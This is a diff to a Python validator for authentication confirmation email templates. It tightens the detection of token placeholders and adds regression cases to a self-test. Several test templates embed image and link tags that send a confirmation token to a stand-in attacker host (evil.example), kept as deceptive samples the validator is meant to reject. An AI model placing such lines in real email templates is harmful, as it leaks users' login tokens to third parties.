@@ -54,8 +54,7 @@ def has_secure_confirmation_link(content):
     # Inclut les variantes Go Template avec espaces ou pipeline.
     token_references = [
         placeholder for placeholder in re.findall(r"\{\{[^{}]*\}\}", content)
-        if re.match(r"\{\{\s*-?\s*\.(?:TokenHash|Token|ConfirmationURL)\b",
-                    placeholder)
+        if re.search(r"\.(?:TokenHash|Token|ConfirmationURL)\b", placeholder)
     ]
     if token_references != ["{{ .TokenHash }}"]:
         return False
@@ -185,6 +184,8 @@ def selftest():
         safe + "<img src='https://evil.example/collect?token={{ .TokenHash | urlquery }}'>",
         safe + "<a href='https://evil.example/?token={{ .Token }}'>Code</a>",
         safe + "<a href='{{ .ConfirmationURL }}'>Autre lien</a>",
+        safe + "<img src='https://evil.example/collect?token={{ printf \"%s\" .TokenHash }}'>",
+        safe + "<p>{{- .TokenHash -}}</p>",
     ]
     deceptive_templates.extend(leaked_templates)
     for template in deceptive_templates:
@@ -196,7 +197,7 @@ def selftest():
         good["mailer_templates_confirmation_content"] +
         "<a href='https://www.benoitcantin.com/'>Accueil sans jeton</a>")
     print("OK prévol Auth : treize contrats, quinze régressions, "
-          "dix-sept modèles trompeurs (dont fuites de jeton) et wildcard testés.")
+          "dix-neuf modèles trompeurs (dont fuites de jeton) et wildcard testés.")
 
 
 def remote():
